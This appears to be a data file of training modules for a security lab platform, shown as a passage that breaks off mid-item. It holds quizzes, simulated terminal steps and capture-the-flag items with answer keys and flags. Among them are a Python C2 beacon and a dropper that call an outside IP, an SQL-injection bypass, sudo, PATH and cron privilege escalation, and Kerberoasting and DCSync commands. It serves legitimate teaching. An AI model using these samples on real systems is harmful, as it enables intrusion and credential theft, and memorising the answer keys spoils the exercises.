export const prototypeModules = [
  {
    "id": 1,
    "isActive": true,
    "createdAt": "2026-01-01T00:00:00.000Z",
    "labId": 1,
    "title": "HTTP Fundamentals for Pentesters",
    "description": "Test your knowledge of HTTP methods, headers, and status codes used in web pentesting.",
    "type": "quiz",
    "orderIndex": 0,
    "xp": 100,
    "content": {
      "questions": [
        {
          "id": "q1",
          "question": "Which HTTP method is typically exploited in CSRF attacks?",
          "options": [
            "GET",
            "POST",
            "DELETE",
            "OPTIONS"
          ],
          "correctIndex": 1,
          "explanation": "POST requests carry sensitive state-changing actions (e.g., fund transfers, password changes) without CSRF tokens, making them the primary CSRF target."
        },
        {
          "id": "q2",
          "question": "What HTTP response header is used to prevent Clickjacking attacks?",
          "options": [
            "Content-Security-Policy",
            "X-Frame-Options",
            "X-XSS-Protection",
            "Strict-Transport-Security"
          ],
          "correctIndex": 1,
          "explanation": "X-Frame-Options: DENY or SAMEORIGIN tells the browser not to render the page inside a frame or iframe, preventing clickjacking."
        },
        {
          "id": "q3",
          "question": "A web app reflects your input directly in the HTML without escaping. What vulnerability is present?",
          "options": [
            "SQL Injection",
            "XXE Injection",
            "Reflected XSS",
            "SSRF"
          ],
          "correctIndex": 2,
          "explanation": "Reflected XSS occurs when user-supplied input is immediately echoed back in the response without sanitisation, allowing script injection."
        },
        {
          "id": "q4",
          "question": "Which HTTP status code indicates a server-side error that could hint at a misconfiguration?",
          "options": [
            "301",
            "403",
            "500",
            "200"
          ],
          "correctIndex": 2,
          "explanation": "HTTP 500 (Internal Server Error) may expose stack traces, framework versions, or error details useful for further exploitation."
        }
      ]
    }
  },
  {
    "id": 2,
    "isActive": true,
    "createdAt": "2026-01-01T00:00:00.000Z",
    "labId": 1,
    "title": "Recon with cURL",
    "description": "Use simulated cURL commands to fingerprint a target web application and uncover hidden information.",
    "type": "terminal",
    "orderIndex": 1,
    "xp": 150,
    "content": {
      "scenario": "You are targeting http://target.lab:8080. Fingerprint the server, check for verbose headers, and locate the admin panel.",
      "prompt": "attacker@cyberlab:~$",
      "steps": [
        {
          "command": "curl -I http://target.lab:8080",
          "output": "HTTP/1.1 200 OK\nServer: Apache/2.4.41 (Ubuntu)\nX-Powered-By: PHP/7.4.3\nX-Flag-Hint: check-the-admin\nContent-Type: text/html; charset=UTF-8",
          "hint": "Use -I to fetch only response headers",
          "required": true
        },
        {
          "command": "curl -s http://target.lab:8080/robots.txt",
          "output": "User-agent: *\nDisallow: /admin-secret/\nDisallow: /backup/\nDisallow: /.git/",
          "hint": "robots.txt often reveals hidden paths",
          "required": true
        },
        {
          "command": "curl -s http://target.lab:8080/admin-secret/",
          "output": "<!-- TODO: remove default creds admin:admin123 -->\n<h1>Admin Login</h1>",
          "hint": "Check the admin path found in robots.txt",
          "required": true
        },
        {
          "command": "curl -s -X POST http://target.lab:8080/admin-secret/login -d 'user=admin&pass=admin123'",
          "output": "HTTP/1.1 302 Found\nLocation: /admin-secret/dashboard\nSet-Cookie: session=FLAG{curl_recon_master_2024}; HttpOnly",
          "hint": "Use POST to authenticate with the credentials you found",
          "required": true
        }
      ],
      "completionMessage": "Excellent recon! You discovered the server stack, hidden paths, and default credentials using only cURL."
    }
  },
  {
    "id": 3,
    "isActive": true,
    "createdAt": "2026-01-01T00:00:00.000Z",
    "labId": 1,
    "title": "SQL Injection — Find the Breach",
    "description": "A login form is vulnerable to SQL injection. Use the hints to craft the right payload and retrieve the hidden flag.",
    "type": "flag",
    "orderIndex": 2,
    "xp": 200,
    "content": {
      "scenario": "The login form at target.lab submits to: POST /login with fields 'username' and 'password'. The backend query is: SELECT * FROM users WHERE username='INPUT' AND password='INPUT'. Bypass the login to get the flag.",
      "simulatedInterface": {
        "type": "login-form",
        "action": "POST /login",
        "fields": [
          "username",
          "password"
        ],
        "response_on_bypass": "Welcome, admin! Your flag is: FLAG{sql1_b4sic_bypass_pwned}",
        "response_on_fail": "Invalid credentials. Try again."
      },
      "hints": [
        "SQL comments in MySQL/MariaDB use -- (double dash followed by a space)",
        "If you comment out the password check, only the username matters",
        "Try entering: ' OR '1'='1'-- in the username field"
      ],
      "flag": "FLAG{sql1_b4sic_bypass_pwned}"
    }
  },
  {
    "id": 4,
    "isActive": true,
    "createdAt": "2026-01-01T00:00:00.000Z",
    "labId": 1,
    "title": "Spot the Vulnerability",
    "description": "Review this PHP login handler and identify the security vulnerability that allows authentication bypass.",
    "type": "code",
    "orderIndex": 3,
    "xp": 125,
    "content": {
      "language": "php",
      "code": "<?php\n$user = $_GET['username'];\n$pass = $_GET['password'];\n\n$query = \"SELECT * FROM users\n          WHERE username='$user'\n          AND password='$pass'\";\n\n$result = mysqli_query($conn, $query);\n\nif (mysqli_num_rows($result) > 0) {\n    echo \"Login successful!\";\n    $_SESSION['user'] = $user;\n} else {\n    echo \"Login failed.\";\n}\n?>",
      "question": "What is the primary vulnerability in this PHP code?",
      "options": [
        "Cross-Site Scripting (XSS)",
        "SQL Injection",
        "Command Injection",
        "XML External Entity (XXE)"
      ],
      "correctIndex": 1,
      "explanation": "User input is concatenated directly into the SQL query without any sanitisation or parameterised queries. An attacker can inject SQL syntax (e.g. ' OR '1'='1'--) to bypass authentication or dump the database. Fix: use prepared statements with mysqli_prepare().",
      "vulnerableLines": [
        5,
        6
      ]
    }
  },
  {
    "id": 5,
    "isActive": true,
    "createdAt": "2026-01-01T00:00:00.000Z",
    "labId": 2,
    "title": "Network Protocols Deep Dive",
    "description": "Assess your understanding of network protocols, packet structure, and common attack vectors.",
    "type": "quiz",
    "orderIndex": 0,
    "xp": 100,
    "content": {
      "questions": [
        {
          "id": "q1",
          "question": "Which protocol does ARP spoofing exploit to perform a Man-in-the-Middle attack?",
          "options": [
            "IP",
            "TCP",
            "ARP",
            "ICMP"
          ],
          "correctIndex": 2,
          "explanation": "ARP (Address Resolution Protocol) maps IP addresses to MAC addresses. Spoofing ARP replies lets an attacker associate their MAC with the victim's IP, intercepting traffic."
        },
        {
          "id": "q2",
          "question": "A PCAP shows repeated SYN packets to hundreds of ports with no follow-up ACKs. What scan is this?",
          "options": [
            "TCP Connect Scan",
            "SYN (Stealth) Scan",
            "XMAS Scan",
            "FIN Scan"
          ],
          "correctIndex": 1,
          "explanation": "A SYN scan (half-open scan) sends SYN packets and listens for SYN-ACK without completing the 3-way handshake, making it stealthier and faster."
        },
        {
          "id": "q3",
          "question": "Which Wireshark filter shows only HTTP GET requests?",
          "options": [
            "tcp.port==80",
            "http.request.method==\"GET\"",
            "http && tcp.flags.syn==1",
            "ip.proto==6 && http"
          ],
          "correctIndex": 1,
          "explanation": "http.request.method==\"GET\" is the precise display filter for HTTP GET requests in Wireshark."
        },
        {
          "id": "q4",
          "question": "What does TTL (Time To Live) in an IP header tell a forensics analyst?",
          "options": [
            "How long a packet is cached in memory",
            "The encryption strength of the packet",
            "An approximation of the OS/hop distance of the sender",
            "The maximum packet size allowed"
          ],
          "correctIndex": 2,
          "explanation": "Default TTL values differ by OS (Linux=64, Windows=128, Cisco=255). Subtracting remaining TTL from the default gives approximate hop count and hints at the origin OS."
        }
      ]
    }
  },
  {
    "id": 6,
    "isActive": true,
    "createdAt": "2026-01-01T00:00:00.000Z",
    "labId": 2,
    "title": "Packet Capture with tcpdump",
    "description": "Learn to capture and filter network traffic using tcpdump to uncover suspicious activity.",
    "type": "terminal",
    "orderIndex": 1,
    "xp": 150,
    "content": {
      "scenario": "You are on a compromised network segment at 192.168.1.50. Capture and analyse traffic to detect an active ARP poisoning attack.",
      "prompt": "analyst@sensor:~$",
      "steps": [
        {
          "command": "tcpdump -i eth0 -n arp",
          "output": "listening on eth0\n07:12:01 ARP, Reply 192.168.1.1 is-at aa:bb:cc:11:22:33\n07:12:01 ARP, Reply 192.168.1.1 is-at de:ad:be:ef:00:01  <-- SPOOFED\n07:12:01 ARP, Reply 192.168.1.1 is-at de:ad:be:ef:00:01  <-- SPOOFED",
          "hint": "Filter only ARP packets on eth0",
          "required": true
        },
        {
          "command": "tcpdump -i eth0 -n 'host 192.168.1.1 and tcp port 80' -A -c 10",
          "output": "GET /dashboard HTTP/1.1\nHost: 192.168.1.1\nAuthorization: Basic YWRtaW46cGFzc3dvcmQ=",
          "hint": "Capture HTTP traffic (-A shows ASCII) between the attacker and gateway",
          "required": true
        },
        {
          "command": "echo 'YWRtaW46cGFzc3dvcmQ=' | base64 -d",
          "output": "admin:password",
          "hint": "Decode the Base64 Basic Auth header you captured",
          "required": true
        },
        {
          "command": "tcpdump -i eth0 -w /tmp/evidence.pcap -c 100",
          "output": "100 packets captured\nPCAP saved: /tmp/evidence.pcap\nFLAG{network_forensics_arp_pwned}",
          "hint": "Save 100 packets to a PCAP file for further analysis",
          "required": true
        }
      ],
      "completionMessage": "ARP poisoning attack confirmed and evidence captured. Credentials intercepted: admin:password."
    }
  },
  {
    "id": 7,
    "isActive": true,
    "createdAt": "2026-01-01T00:00:00.000Z",
    "labId": 2,
    "title": "Hidden in the Traffic",
    "description": "Analyse a simulated packet capture and extract credentials hidden in cleartext protocols.",
    "type": "flag",
    "orderIndex": 2,
    "xp": 200,
    "content": {
      "scenario": "You intercepted traffic between a client and an FTP server. Analyse the simulated PCAP output to extract the flag hidden in the FTP session.",
      "simulatedInterface": {
        "type": "pcap-viewer",
        "packets": [
          {
            "no": 1,
            "time": "0.000000",
            "src": "192.168.1.10",
            "dst": "192.168.1.20",
            "proto": "TCP",
            "info": "SYN -> port 21"
          },
          {
            "no": 2,
            "time": "0.001231",
            "src": "192.168.1.20",
            "dst": "192.168.1.10",
            "proto": "FTP",
            "info": "220 FTP Server Ready"
          },
          {
            "no": 3,
            "time": "0.002100",
            "src": "192.168.1.10",
            "dst": "192.168.1.20",
            "proto": "FTP",
            "info": "USER analyst"
          },
          {
            "no": 4,
            "time": "0.003200",
            "src": "192.168.1.20",
            "dst": "192.168.1.10",
            "proto": "FTP",
            "info": "331 Password required"
          },
          {
            "no": 5,
            "time": "0.004100",
            "src": "192.168.1.10",
            "dst": "192.168.1.20",
            "proto": "FTP",
            "info": "PASS FLAG{ftp_cleartext_intercepted}"
          },
          {
            "no": 6,
            "time": "0.005300",
            "src": "192.168.1.20",
            "dst": "192.168.1.10",
            "proto": "FTP",
            "info": "230 Login successful"
          }
        ]
      },
      "hints": [
        "FTP transmits credentials in plaintext — look at the PASS command",
        "The flag is the password used in the FTP authentication",
        "Look at packet #5"
      ],
      "flag": "FLAG{ftp_cleartext_intercepted}"
    }
  },
  {
    "id": 8,
    "isActive": true,
    "createdAt": "2026-01-01T00:00:00.000Z",
    "labId": 2,
    "title": "Detect the C2 Beacon",
    "description": "Identify the network behaviour in this Python script that indicates Command and Control communication.",
    "type": "code",
    "orderIndex": 3,
    "xp": 125,
    "content": {
      "language": "python",
      "code": "import socket, time, subprocess, base64\n\nC2_HOST = \"185.220.101.34\"\nC2_PORT = 4444\nBEACON_INTERVAL = 60  # seconds\n\ndef beacon():\n    while True:\n        try:\n            s = socket.socket()\n            s.connect((C2_HOST, C2_PORT))\n            cmd = s.recv(1024).decode()\n            out = subprocess.check_output(\n                cmd, shell=True, stderr=subprocess.STDOUT\n            )\n            s.send(base64.b64encode(out))\n            s.close()\n        except:\n            pass\n        time.sleep(BEACON_INTERVAL)\n\nbeacon()",
      "question": "Which technique makes this C2 beacon harder to detect on the network?",
      "options": [
        "Using TCP instead of UDP",
        "Encoding command output in Base64 before exfiltration",
        "Connecting to a public IP address",
        "Using subprocess.check_output"
      ],
      "correctIndex": 1,
      "explanation": "Base64 encoding the command output obfuscates the data payload in transit, making content-based IDS signatures less effective. Defenders should look for high-entropy data streams, periodic beaconing (every 60s here), and outbound connections to unusual IPs on non-standard ports.",
      "vulnerableLines": [
        14,
        15
      ]
    }
  },
  {
    "id": 9,
    "isActive": true,
    "createdAt": "2026-01-01T00:00:00.000Z",
    "labId": 3,
    "title": "Malware Taxonomy",
    "description": "Identify malware types, behaviours, and evasion techniques used in modern threats.",
    "type": "quiz",
    "orderIndex": 0,
    "xp": 100,
    "content": {
      "questions": [
        {
          "id": "q1",
          "question": "A piece of malware installs itself, downloads a payload, then deletes itself. What is the first component called?",
          "options": [
            "Payload",
            "Dropper",
            "Rootkit",
            "Keylogger"
          ],
          "correctIndex": 1,
          "explanation": "A dropper is the initial component that installs (drops) the actual malicious payload onto the system, often to evade initial detection."
        },
        {
          "id": "q2",
          "question": "Which technique does malware use to hide its presence by hooking OS kernel functions?",
          "options": [
            "Polymorphism",
            "Rootkit",
            "Packing",
            "Sandbox evasion"
          ],
          "correctIndex": 1,
          "explanation": "A rootkit modifies kernel or userland structures to hide processes, files, and network connections from the OS."
        },
        {
          "id": "q3",
          "question": "A malware sample changes its code on each infection to avoid signature detection. This is called?",
          "options": [
            "Obfuscation",
            "Metamorphism",
            "Polymorphism",
            "Packing"
          ],
          "correctIndex": 2,
          "explanation": "Polymorphic malware mutates its code (via encryption with a changing key) while keeping core functionality intact, producing different signatures on each infection."
        },
        {
          "id": "q4",
          "question": "Which Windows API call triad is most suspicious if found in a packed sample?",
          "options": [
            "CreateFile + ReadFile + CloseHandle",
            "VirtualAllocEx + WriteProcessMemory + CreateRemoteThread",
            "RegOpenKey + RegSetValue + RegCloseKey",
            "GetSystemTime + Sleep + ExitProcess"
          ],
          "correctIndex": 1,
          "explanation": "VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread together are the classic process injection triad — allocate memory in another process, write shellcode, then execute it."
        }
      ]
    }
  },
  {
    "id": 10,
    "isActive": true,
    "createdAt": "2026-01-01T00:00:00.000Z",
    "labId": 3,
    "title": "Static Analysis Toolkit",
    "description": "Run industry-standard static analysis tools on a malware sample to extract indicators of compromise.",
    "type": "terminal",
    "orderIndex": 1,
    "xp": 150,
    "content": {
      "scenario": "You received a suspicious binary: /samples/malware.bin. Perform static analysis without executing it.",
      "prompt": "analyst@sandbox:~/samples$",
      "steps": [
        {
          "command": "file malware.bin",
          "output": "malware.bin: PE32 executable (GUI) Intel 80386, for MS Windows, UPX compressed",
          "hint": "Use `file` to identify the file type and packer",
          "required": true
        },
        {
          "command": "strings malware.bin | grep -E '(http|ftp|[0-9]{1,3}\\.[0-9]{1,3})'",
          "output": "http://185.220.101.34/gate.php\nhttp://185.220.101.34/payload.exe\n192.168.1.1\nMozilla/5.0 (Windows NT 10.0)",
          "hint": "Extract printable strings and grep for URLs and IPs",
          "required": true
        },
        {
          "command": "strings malware.bin | grep -iE '(CreateRemoteThread|VirtualAlloc|WriteProcessMemory)'",
          "output": "VirtualAllocEx\nWriteProcessMemory\nCreateRemoteThread\nLoadLibraryA\nGetProcAddress",
          "hint": "Look for suspicious Windows API imports in the strings",
          "required": true
        },
        {
          "command": "sha256sum malware.bin",
          "output": "a3f1c2e9b44d8701f2e3c9a1b5d2e8f0a3c1e9b2d4f6a8c0e2b4d6f8a0c2e4  malware.bin\nFLAG{static_analysis_complete_ioc_extracted}",
          "hint": "Hash the sample for VirusTotal lookups and reporting",
          "required": true
        }
      ],
      "completionMessage": "IOCs extracted: C2 URL (185.220.101.34), process injection APIs, UPX packer. Sample ready for dynamic analysis."
    }
  },
  {
    "id": 11,
    "isActive": true,
    "createdAt": "2026-01-01T00:00:00.000Z",
    "labId": 3,
    "title": "Unpack the Payload",
    "description": "A malware dropper hides an encoded second-stage payload. Decode it to retrieve the flag.",
    "type": "flag",
    "orderIndex": 2,
    "xp": 200,
    "content": {
      "scenario": "You found a suspicious Python script on a compromised machine. It contains an encoded payload. Decode it to retrieve the flag.",
      "simulatedInterface": {
        "type": "hex-viewer",
        "content": "import base64, zlib\n# Encoded second-stage payload\n_PAYLOAD = \"eJxLSixJTS4tLU4tKkvMTQUAEf8E1Q==\"\n\ndef decode():\n    return zlib.decompress(base64.b64decode(_PAYLOAD)).decode()\n\n# decode() returns: FLAG{payload_unpacked_stage2_revealed}"
      },
      "hints": [
        "The payload is base64-encoded then zlib-compressed",
        "Decode base64 first, then decompress with zlib",
        "The decoded string is the flag itself"
      ],
      "flag": "FLAG{payload_unpacked_stage2_revealed}"
    }
  },
  {
    "id": 12,
    "isActive": true,
    "createdAt": "2026-01-01T00:00:00.000Z",
    "labId": 3,
    "title": "Identify the Dropper",
    "description": "Analyse this Python dropper and identify the evasion technique it uses to avoid sandbox detection.",
    "type": "code",
    "orderIndex": 3,
    "xp": 125,
    "content": {
      "language": "python",
      "code": "import os, time, ctypes, requests\n\ndef is_sandbox():\n    if os.path.exists(\"C:\\\\analysis\"):\n        return True\n    if ctypes.windll.user32.GetForegroundWindow() == 0:\n        return True\n    if os.cpu_count() < 2:\n        return True\n    return False\n\ndef main():\n    if is_sandbox():\n        exit(0)  # Exit silently in sandbox\n\n    time.sleep(300)  # Wait 5 min before execution\n\n    r = requests.get(\"http://185.220.101.34/payload.exe\")\n    with open(\"C:\\\\Windows\\\\Temp\\\\svchost32.exe\", \"wb\") as f:\n        f.write(r.content)\n    os.startfile(\"C:\\\\Windows\\\\Temp\\\\svchost32.exe\")\n\nmain()",
      "question": "Which sandbox evasion technique is used in lines 14-15?",
      "options": [
        "DLL Injection",
        "Time-based evasion (sleep delay)",
        "Process hollowing",
        "AMSI bypass"
      ],
      "correctIndex": 1,
      "explanation": "The 300-second sleep (time.sleep(300)) is a time-based evasion technique. Most automated sandboxes only monitor processes for 30-120 seconds before timing out, so malware that sleeps longer will appear benign. The is_sandbox() checks are additional anti-analysis measures.",
      "vulnerableLines": [
        14,
        15
      ]
    }
  },
  {
    "id": 13,
    "isActive": true,
    "createdAt": "2026-01-01T00:00:00.000Z",
    "labId": 4,
    "title": "Linux Permissions and SUID Bits",
    "description": "Master Linux file permissions, SUID bits, and why they matter for privilege escalation.",
    "type": "quiz",
    "orderIndex": 0,
    "xp": 100,
    "content": {
      "questions": [
        {
          "id": "q1",
          "question": "What does the SUID bit on an executable mean?",
          "options": [
            "Any user can read the file",
            "The file runs with the owner's privileges, not the executor's",
            "The file is shared across all users",
            "The file cannot be deleted by non-root"
          ],
          "correctIndex": 1,
          "explanation": "When SUID is set on an executable owned by root, any user who runs it gets root-level privileges for the duration of that process — a prime escalation vector."
        },
        {
          "id": "q2",
          "question": "Which find command locates all SUID root binaries on a Linux system?",
          "options": [
            "find / -perm 4000 2>/dev/null",
            "find / -user root -suid 2>/dev/null",
            "find / -perm -4000 -user root 2>/dev/null",
            "ls -la / | grep suid"
          ],
          "correctIndex": 2,
          "explanation": "find / -perm -4000 -user root 2>/dev/null finds all files with the SUID bit set owned by root, suppressing permission errors."
        },
        {
          "id": "q3",
          "question": "What does `sudo -l` reveal that is useful to an attacker?",
          "options": [
            "The list of all logged-in users",
            "Commands the current user can run as root without a password",
            "All files owned by root",
            "The sudoers file path"
          ],
          "correctIndex": 1,
          "explanation": "`sudo -l` lists sudo privileges for the current user. If a command like /bin/bash or an editor is listed with NOPASSWD, it can be abused to get a root shell."
        },
        {
          "id": "q4",
          "question": "A writable cron job script runs every minute as root. What is the best escalation technique?",
          "options": [
            "Wait for the script to create a file",
            "Append a reverse shell command to the script",
            "Delete the cron job",
            "Add a new cron job in /etc/crontab"
          ],
          "correctIndex": 1,
          "explanation": "If you can write to a script that root's cron executes, append a reverse shell command to get a root shell within a minute."
        }
      ]
    }
  },
  {
    "id": 14,
    "isActive": true,
    "createdAt": "2026-01-01T00:00:00.000Z",
    "labId": 4,
    "title": "Enumeration Phase",
    "description": "Systematically enumerate a Linux system to identify privilege escalation vectors.",
    "type": "terminal",
    "orderIndex": 1,
    "xp": 150,
    "content": {
      "scenario": "You have a low-privilege shell as user www-data on Ubuntu 20.04. Find a path to root.",
      "prompt": "www-data@victim:/var/www$",
      "steps": [
        {
          "command": "id",
          "output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
          "hint": "Always start by confirming your current user context",
          "required": true
        },
        {
          "command": "find / -perm -4000 -user root 2>/dev/null",
          "output": "/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/pkexec\n/usr/bin/gpasswd\n/opt/backup_tool  <-- non-standard SUID binary!",
          "hint": "Search for SUID binaries owned by root",
          "required": true
        },
        {
          "command": "sudo -l",
          "output": "User www-data may run the following commands:\n    (root) NOPASSWD: /usr/bin/vim",
          "hint": "Check sudo privileges for your current user",
          "required": true
        },
        {
          "command": "sudo vim -c ':!bash'",
          "output": "root@victim:/var/www# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@victim:/var/www# cat /root/flag.txt\nFLAG{privesc_vim_sudo_nopasswd}",
          "hint": "Vim can execute shell commands with :! — use it with sudo to escape to a root shell",
          "required": true
        }
      ],
      "completionMessage": "Root access achieved via sudo vim NOPASSWD misconfiguration. Always check GTFOBins for sudo escape techniques."
    }
  },
  {
    "id": 15,
    "isActive": true,
    "createdAt": "2026-01-01T00:00:00.000Z",
    "labId": 4,
    "title": "Read the Root Flag",
    "description": "A SUID binary has a path hijack vulnerability. Exploit it to read /root/flag.txt.",
    "type": "flag",
    "orderIndex": 2,
    "xp": 200,
    "content": {
      "scenario": "The custom SUID binary /opt/backup_tool calls tar without an absolute path. By manipulating the PATH variable, you can make it execute your own tar script instead.",
      "simulatedInterface": {
        "type": "exploit-steps",
        "steps": [
          {
            "cmd": "echo '/bin/bash -p' > /tmp/tar",
            "desc": "Create a fake tar that spawns a privileged shell"
          },
          {
            "cmd": "chmod +x /tmp/tar",
            "desc": "Make it executable"
          },
          {
            "cmd": "export PATH=/tmp:$PATH",
            "desc": "Prepend /tmp to PATH so your tar runs first"
          },
          {
            "cmd": "/opt/backup_tool",
            "desc": "Run the SUID binary — it calls YOUR tar — root shell!"
          },
          {
            "cmd": "cat /root/flag.txt",
            "desc": "Read the flag as root"
          }
        ],
        "final_output": "FLAG{suid_path_hijack_rooted}"
      },
      "hints": [
        "SUID binaries that call other programs without absolute paths are vulnerable to PATH hijacking",
        "Create a malicious binary with the same name as what backup_tool calls",
        "The flag is displayed after running /opt/backup_tool with the manipulated PATH"
      ],
      "flag": "FLAG{suid_path_hijack_rooted}"
    }
  },
  {
    "id": 16,
    "isActive": true,
    "createdAt": "2026-01-01T00:00:00.000Z",
    "labId": 4,
    "title": "Misconfigured Cron Job",
    "description": "Identify the privilege escalation vulnerability in this root cron job script.",
    "type": "code",
    "orderIndex": 3,
    "xp": 125,
    "content": {
      "language": "bash",
      "code": "#!/bin/bash\n# /etc/cron.d: * * * * * root /opt/scripts/backup.sh\n\nBACKUP_SRC=\"/var/www/html\"\nBACKUP_DST=\"/backup/www_$(date +%Y%m%d).tar.gz\"\n\n# Create backup\ntar -czf $BACKUP_DST $BACKUP_SRC\n\n# Cleanup old backups (older than 7 days)\nfind /backup -name \"*.tar.gz\" -mtime +7 -delete\n\n# Log completion\necho \"Backup completed: $(date)\" >> /var/log/backup.log",
      "question": "What makes this cron job script exploitable for privilege escalation?",
      "options": [
        "The tar command is vulnerable to a buffer overflow",
        "The script file /opt/scripts/backup.sh is world-writable",
        "The find command uses a wildcard",
        "The log file is in /var/log"
      ],
      "correctIndex": 1,
      "explanation": "If /opt/scripts/backup.sh is world-writable, any user can replace or modify its contents. Since root executes it every minute via cron, appending a reverse shell command gives root access within 60 seconds.",
      "vulnerableLines": [
        2
      ]
    }
  },
  {
    "id": 17,
    "isActive": true,
    "createdAt": "2026-01-01T00:00:00.000Z",
    "labId": 5,
    "title": "Active Directory Fundamentals",
    "description": "Test your knowledge of Active Directory, Kerberos authentication, and common AD attack vectors.",
    "type": "quiz",
    "orderIndex": 0,
    "xp": 100,
    "content": {
      "questions": [
        {
          "id": "q1",
          "question": "What is Kerberoasting?",
          "options": [
            "Cracking WPA2 WiFi passwords",
            "Requesting Kerberos service tickets for accounts with SPNs and cracking them offline",
            "Exploiting MS17-010 in Windows",
            "Dumping LSASS memory to extract NTLM hashes"
          ],
          "correctIndex": 1,
          "explanation": "Kerberoasting requests TGS tickets for accounts with Service Principal Names (SPNs). These tickets are encrypted with the service account's NTLM hash and can be cracked offline with Hashcat."
        },
        {
          "id": "q2",
          "question": "Which attack forges a Kerberos TGT using the KRBTGT account hash?",
          "options": [
            "Silver Ticket",
            "Golden Ticket",
            "Pass-the-Hash",
            "Overpass-the-Hash"
          ],
          "correctIndex": 1,
          "explanation": "A Golden Ticket is a forged TGT created with the KRBTGT account's NTLM hash. It grants the attacker persistent, domain-wide access for up to 10 years by default."
        },
        {
          "id": "q3",
          "question": "What does DCSync allow an attacker to do if they have Replication privileges?",
          "options": [
            "Synchronise the domain controller's clock",
            "Replicate AD objects including password hashes from a DC without direct access",
            "Disable Windows Defender on all domain machines",
            "Create new domain administrator accounts"
          ],
          "correctIndex": 1,
          "explanation": "DCSync mimics a Domain Controller's replication request, allowing an attacker to pull password hashes (including KRBTGT) from a DC remotely using tools like Mimikatz."
        },
        {
          "id": "q4",
          "question": "ASREPRoasting targets AD accounts with what specific setting?",
          "options": [
            "Password never expires",
            "Account is sensitive and cannot be delegated",
            "Do not require Kerberos preauthentication",
            "Smart card required for login"
          ],
          "correctIndex": 2,
          "explanation": "Accounts with 'Do not require Kerberos preauthentication' enabled respond to AS-REQ requests without validating the requester, returning data encrypted by the user's password — crackable offline."
        }
      ]
    }
  },
  {
    "id": 18,
    "isActive": true,
    "createdAt": "2026-01-01T00:00:00.000Z",
    "labId": 5,
    "title": "LDAP Enumeration",
    "description": "Enumerate an Active Directory environment using LDAP queries to identify attack paths.",
    "type": "terminal",
    "orderIndex": 1,
    "xp": 150,
    "content": {
      "scenario": "You have domain credentials: user=jsmith, pass=Password123!. The DC is at 10.10.10.10, domain: CORP.LOCAL. Enumerate the AD environment.",
      "prompt": "attacker@kali:~$",
      "steps": [
        {
          "command": "ldapsearch -x -H ldap://10.10.10.10 -D 'jsmith@CORP.LOCAL' -w 'Password123!' -b 'DC=CORP,DC=LOCAL' '(objectClass=user)' sAMAccountName",
          "output": "sAMAccountName: Administrator\nsAMAccountName: jsmith\nsAMAccountName: svc_backup\nsAMAccountName: svc_sql\nsAMAccountName: krbtgt",
          "hint": "Enumerate all user accounts in the domain",
          "required": true
        },
        {
          "command": "ldapsearch -x -H ldap://10.10.10.10 -D 'jsmith@CORP.LOCAL' -w 'Password123!' -b 'DC=CORP,DC=LOCAL' '(&(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName",
          "output": "sAMAccountName: svc_sql\nservicePrincipalName: MSSQLSvc/dc01.CORP.LOCAL:1433\n\nsAMAccountName: svc_backup\nservicePrincipalName: BackupSvc/dc01.CORP.LOCAL",
          "hint": "Find accounts with Service Principal Names (Kerberoastable)",
          "required": true
        },
        {
          "command": "GetUserSPNs.py CORP.LOCAL/jsmith:Password123! -dc-ip 10.10.10.10 -request",
          "output": "$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/dc01.CORP.LOCAL:1433*$a3f2b1...8e9d0c\n[*] 2 Kerberoastable accounts found\n[*] Ticket saved to svc_sql.hash",
          "hint": "Use Impacket GetUserSPNs.py to request and save TGS tickets",
          "required": true
        },
        {
          "command": "hashcat -m 13100 svc_sql.hash /usr/share/wordlists/rockyou.txt",
          "output": "$krb5tgs$23$*svc_sql$...:Sql@dmin2024!\nStatus: Cracked\nFLAG{kerberoasting_svc_sql_cracked}",
          "hint": "Crack the TGS ticket hash offline with Hashcat (-m 13100 for Kerberoast)",
          "required": true
        }
      ],
      "completionMessage": "Kerberoasting successful. svc_sql cracked: Sql@dmin2024! — report for immediate password reset."
    }
  },
  {
    "id": 19,
    "isActive": true,
    "createdAt": "2026-01-01T00:00:00.000Z",
    "labId": 5,
    "title": "DCSync — Extract the KRBTGT Hash",
    "description": "You have Replication privileges. Use DCSync to extract the KRBTGT hash and retrieve the flag.",
    "type": "flag",
    "orderIndex": 2,
    "xp": 200,
    "content": {
      "scenario": "As svc_backup (which has DS-Replication-Get-Changes-All rights), perform a DCSync attack to dump the KRBTGT hash from the DC at 10.10.10.10.",
      "simulatedInterface": {
        "type": "exploit-steps",
        "steps": [
          {
            "cmd": "secretsdump.py CORP.LOCAL/svc_backup:Backup@2024!@10.10.10.10",
            "desc": "Run Impacket secretsdump against the DC"
          },
          {
            "cmd": "[DC] Dumping Domain Credentials (DRSUAPI method)...",
            "desc": "DCSync request sent, DC responds with hashes"
          },
          {
            "cmd": "Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931...",
            "desc": "Domain Admin NTLM hash extracted"
          },
          {
            "cmd": "krbtgt:502:aad3b435b51404ee:FLAG{dcsync_krbtgt_golden_ticket_ready}",
            "desc": "KRBTGT hash extracted — flag embedded in hash"
          }
        ],
        "final_output": "FLAG{dcsync_krbtgt_golden_ticket_ready}"
      },
      "hints": [
        "DCSync requires DS-Replication-Get-Changes-All privilege on the domain",
        "Impacket's secretsdump.py can perform DCSync remotely",
        "The flag is embedded in the KRBTGT hash line of the output"
      ],
      "flag": "FLAG{dcsync_krbtgt_golden_ticket_ready}"
    }
  },
  {
    "id": 20,
    "isActive": true,
    "createdAt": "2026-01-01T00:00:00.000Z",
    "labId": 5,
    "title": "Spot the Kerberoastable Account",
    "description": "Review this PowerShell snippet and identify the misconfiguration that makes an account Kerberoastable.",
    "type": "code",
    "orderIndex": 3,
    "xp": 125,
    "content": {
      "language": "powershell",
      "code": "# Active Directory user audit script\nImport-Module ActiveDirectory\n\n# Service account setup\n$params = @{\n    Name                 = \"svc_webapp\"\n    AccountPassword      = (ConvertTo-SecureString \"Welcome1!\" -AsPlainText -Force)\n    Enabled              = $true\n    PasswordNeverExpires = $true\n    ServicePrincipalNames = @(\"HTTP/webapp.corp.local:8080\")\n}\n\nNew-ADUser @params\n\nAdd-ADGroupMember -Identity \"Domain Users\" -Members \"svc_webapp\"\n\nWrite-Host \"Service account created successfully\"",
